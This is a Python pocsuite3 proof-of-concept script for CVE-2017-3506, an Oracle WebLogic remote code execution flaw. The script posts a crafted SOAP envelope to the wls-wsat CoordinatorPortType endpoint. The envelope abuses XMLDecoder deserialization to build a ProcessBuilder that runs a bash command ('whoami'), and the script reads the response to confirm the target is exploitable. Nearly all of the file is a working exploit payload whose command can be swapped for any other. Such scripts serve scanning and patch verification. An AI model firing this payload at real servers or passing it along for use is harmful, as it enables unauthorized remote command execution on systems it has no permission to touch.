#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite3.api import POCBase, Output
from pocsuite3.api import register_poc
import requests

def poc(url):
    if not url.startswith("http"):
            url = "http://" + url
    if "/" in url:
            url += '/wls-wsat/CoordinatorPortType'
    try:
        res = requests.post(url, data=poc_str, verify=False, timeout=5, headers=headers)
        response = res.text
    except Exception:
        response = ""
    return response

VUL=['CVE-2017-3506']
headers = {'user-agent': 'ceshi/0.0.1','content-type': 'text/xml'}
poc_str = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0">
              <string>/bin/bash</string>
            </void>
            <void index="1">
              <string>-c</string>
            </void>
            <void index="2">
              <string>whoami</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
'''

class TestPOC(POCBase):
    name = 'OracleWeblogic_RCE_CVE-2017-3506'
    vulID = 'CVE-2017-3506'  # https://www.seebug.org/vuldb/ssvid-78176
    author = ['debug']
    vulType = 'RCE'
    version = '1.0'    
    references = ['http://www.s3cur1ty.de/m1adv2013-003']
    desc = '''
		   Oracle Weblogic RCE（CVE-2017-3506）主要是由于wls组件使用了webservice来处理soap请求
		   在weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld方法中对WorkContextXmlInputAdapter类进行了实例化，
		   并调用WorkContextXmlInputAdapter类的构造方法，通过XMLDecoder()进行反序列化操作执行远程命令
		   '''

    vulDate = '2016-12-06'
    createDate = '2016-12-06'
    updateDate = '2016-12-06'

    appName = 'Oracle Weblogic'
    appVersion = '10.3.6,12.1.3,12.2.1,12.2.1.1,12.2.1.2'
    appPowerLink = ''
    samples = ['']
    
    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result={}
        response = poc(self.url)
        if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url+' OracleWeblogic_RCE_CVE-2017-3506' + ' is exist!'
        return self.parse_output(result)
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)

